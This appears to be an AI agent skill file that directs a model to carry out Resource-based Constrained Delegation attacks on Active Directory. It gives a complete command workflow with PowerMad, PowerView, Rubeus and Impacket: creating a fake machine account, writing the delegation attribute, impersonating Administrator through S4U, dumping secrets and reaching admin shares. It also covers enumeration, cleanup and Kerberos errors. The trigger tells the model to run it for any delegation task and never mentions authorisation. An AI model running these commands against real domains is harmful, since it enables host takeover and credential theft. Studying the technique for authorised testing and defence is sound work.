---
name: resource-based-constrained-delegation
description: Execute Resource-based Constrained Delegation (RBCD) attacks in Active Directory environments. Use this skill whenever the user needs to exploit write permissions on computer accounts to gain privileged access, perform S4U attacks, enumerate RBCD configurations, or troubleshoot Kerberos delegation issues. Trigger this skill for any AD Kerberos delegation task, machine account manipulation, or when the user mentions RBCD, msDS-AllowedToActOnBehalfOfOtherIdentity, S4U2Self, S4U2Proxy, or constrained delegation abuse.
---

# Resource-based Constrained Delegation (RBCD)

A skill for executing and understanding Resource-based Constrained Delegation attacks in Active Directory environments.

## When to Use This Skill

Use this skill when:
- You have write permissions on a computer account and want to gain privileged access
- You need to perform S4U2Self/S4U2Proxy attacks
- You want to enumerate RBCD configurations in a domain
- You're troubleshooting Kerberos delegation errors
- You need to clean up RBCD configurations after testing
- The user mentions RBCD, constrained delegation, msDS-AllowedToActOnBehalfOfOtherIdentity, or S4U attacks

## Core Concept

RBCD allows any user with **write permissions** on a computer account to configure which principals can impersonate any user against that computer. Unlike classic constrained delegation, this doesn't require domain admin privileges.

**Key attribute**: `msDS-AllowedToActOnBehalfOfOtherIdentity`

## Attack Prerequisites

1. **Write access** to a target computer account (GenericAll/GenericWrite/WriteDacl/WriteProperty)
2. **A service account** with an SPN (can create one via MachineAccountQuota - default 10 per user)
3. **Knowledge of target SPN** (e.g., cifs/victim.domain.local)

## Complete Attack Workflow

### Step 1: Check MachineAccountQuota

```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

If quota > 0, you can create computer objects without additional privileges.

### Step 2: Create Attacker-Controlled Computer Object

**PowerShell (PowerMad):**
```powershell
Import-Module PowerMad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Get-DomainComputer SERVICEA
```

**Linux (Impacket):**
```bash
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'
```

### Step 3: Configure RBCD on Target

**PowerShell:**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
```

**PowerView:**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**Linux (Impacket):**
```bash
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'
```

### Step 4: Generate Hashes for Attacker Account

```bash
# Windows (Rubeus)
Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local

# Linux (impacket)
# Use the password directly in commands, or generate with:
python3 -c "from impacket.krb5.asn1 import *; from impacket.crypto import *; print('Use password directly')"
```

### Step 5: Execute S4U Attack

**Windows (Rubeus):**
```bash
# Basic attack
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256_hash> /aes128:<aes128_hash> /rc4:<rc4_hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt

# Multiple service tickets
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES256> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

**Linux (Impacket):**
```bash
# Request impersonation ticket
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# Use the ticket
export KRB5CCNAME=$(pwd)/Administrator.ccache
impacket-secretsdump -k -no-pass Administrator@victim.domain.local

# Access shares
ls \\victim.domain.local\C$
```

### Step 6: Access Target

```bash
# Windows
ls \\victim.domain.local\C$

# Linux
impacket-smbclient -k -no-pass Administrator@victim.domain.local
```

## Enumeration

### Find Computers with RBCD Configured

**PowerShell:**
```powershell
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

**Linux (Impacket):**
```bash
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

## Cleanup

**PowerShell:**
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

**Linux (Impacket):**
```bash
# Remove specific principal
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'

# Flush entire list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Common Kerberos Errors

| Error | Cause | Solution |
|-------|-------|----------|
| `KDC_ERR_ETYPE_NOTSUPP` | DES/RC4 disabled, only RC4 hash provided | Supply AES256 hash (or all three: RC4, AES128, AES256) |
| `KRB_AP_ERR_SKEW` | Time skew between client and DC | Sync time with domain controller |
| `preauth_failed` | Wrong credentials or missing `$` in username | Ensure username ends with `$` for computer accounts |
| `KDC_ERR_BADOPTION` | User cannot access service, service doesn't exist, or privileges lost | Verify user can access service, check service is running, re-grant RBCD |

## Important Notes

1. **Cannot be delegated**: Some users have this attribute set to True - you cannot impersonate them (visible in BloodHound)

2. **Forwardable vs Non-Forwardable**: RBCD works with non-forwardable TGS from S4U2Self, unlike classic constrained delegation which requires forwardable tickets

3. **LDAP Signing**: If enforced, use `impacket-rbcd -use-ldaps`

4. **AES Preference**: Modern domains often restrict RC4 - prefer AES keys when possible

5. **SPN Selection**: Use correct SPNs (cifs, host, http, ldap, krbtgt, MSSQLSvc, etc.) - see available services documentation

6. **ADWS Alternative**: If LDAP is filtered, you can write RBCD SD over AD Web Services (ADWS)

7. **Kerberos Relay**: RBCD is frequently the final step in Kerberos relay chains to achieve local SYSTEM

## Available Service Tickets

Common SPNs to target:
- `cifs/victim.domain.local` - File shares
- `host/victim.domain.local` - Host service
- `http/victim.domain.local` - Web services
- `ldap/victim.domain.local` - LDAP
- `krbtgt/domain.local` - TGT (domain admin)
- `MSSQLSvc/victim.domain.local` - SQL Server
- `wsman/victim.domain.local` - WinRM
- `RPCSS/victim.domain.local` - RPC

## References

- [Wagging the Dog - Shenanigans Labs](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [Another Word on Delegation - HarmJ0y](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [IRED Team - RBCD Guide](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
- [Stealthbits - RBCD Abuse](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [Kerberos Overview - SpecterOps](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [Impacket rbcd.py](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [TLDRBins RBCD Cheatsheet](https://tldrbins.github.io/rbcd/)
